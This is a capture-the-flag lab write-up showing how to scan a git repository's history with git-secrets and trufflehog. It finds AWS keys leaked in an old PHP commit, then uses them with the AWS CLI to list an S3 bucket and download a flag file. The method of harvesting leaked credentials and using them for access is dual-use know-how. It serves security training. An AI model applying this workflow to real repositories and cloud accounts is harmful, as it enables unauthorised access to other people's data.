pwnedlabs.io/labs/hunt-for-secrets-in-git-repos

GitHub repo: `https://github.com/huge-logistics/cargo-logistics-dev`

Manually navigate to the git repo and also clone it for manual inspection:

```bash
git clone https://github.com/huge-logistics/cargo-logistics-dev
```

Download and use the tool `git-secrets`

```bash
git clone https://github.com/awslabs/git-secrets
cd git-secrets
make install

cd cargo-logistics-dev/
git secrets --install
git secrets --register-aws
git secrets --scan
git secrets --scan-history
	...log-upload.php          'key'
	...log-upload.php          'secret'
```

The history scan revealed a commit with a `.php` file that contains AWS secrets. Show that commit and use the AWS creds to authenticate:

```bash
git show abcdefg0123456789abcdefg0123456789:log-s3-test/log-upload.php
	region
	key
	secret
	bucket
```

AWS configure and list files in the bucket, get flag:
```bash
aws configure --profile git
aws sts get-caller-identity --profile git
aws s3 ls huge-logistics-transact --profile git
aws s3 cp s3://huge-logistics-transact/flag.txt . --profile git
```

Can also find secrets in Git repos with `trufflehog`:
```bash
pip install trufflehog       # Exegol/docker
brew install trufflehog     # Mac
apt install trufflehog        # Debian

Or:

git clone https://github.com/trufflesecurity/trufflehog/; cd trufflehog
go install

trufflehog git file://cargo-logistics-dev/ --regex --no-entropy
trufflehog git https://github.com/huge-logistics/cargo-logistics-dev --max-depth 2
```
![[Pasted image 20260605095423.png]]